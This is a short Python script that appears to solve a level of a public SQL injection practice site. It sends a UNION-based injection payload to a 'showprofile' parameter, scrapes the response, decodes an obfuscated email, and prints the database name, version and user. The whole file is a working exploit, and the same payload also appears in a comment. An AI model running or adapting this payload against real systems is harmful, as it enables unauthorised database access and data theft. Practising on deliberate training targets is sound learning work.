import requests, sys
from bs4 import BeautifulSoup
from util import decrypt_xor_email

#http://www.zixem.altervista.org/SQLi/level2.php?showprofile=-4%27%20union%20select%20database(),version(),user(),4--+

target = "http://www.zixem.altervista.org/SQLi/level2.php?showprofile="
payload = "-1' union select database(),version(),user(),4--+"
exploit = target + payload

req_result = requests.get(exploit)
soup = BeautifulSoup(req_result.text, 'lxml')

all_u = soup.find_all("u")

info = []

for u in all_u[1:]:
    info.append(u.previous_element.previous_element.previous_element.previous_element)

enc_email = soup.find("a", class_="__cf_email__")
user = decrypt_xor_email(enc_email)

print("DB NAME: " + info[0])
print("Version: " + info[1])
print("User: " + user)
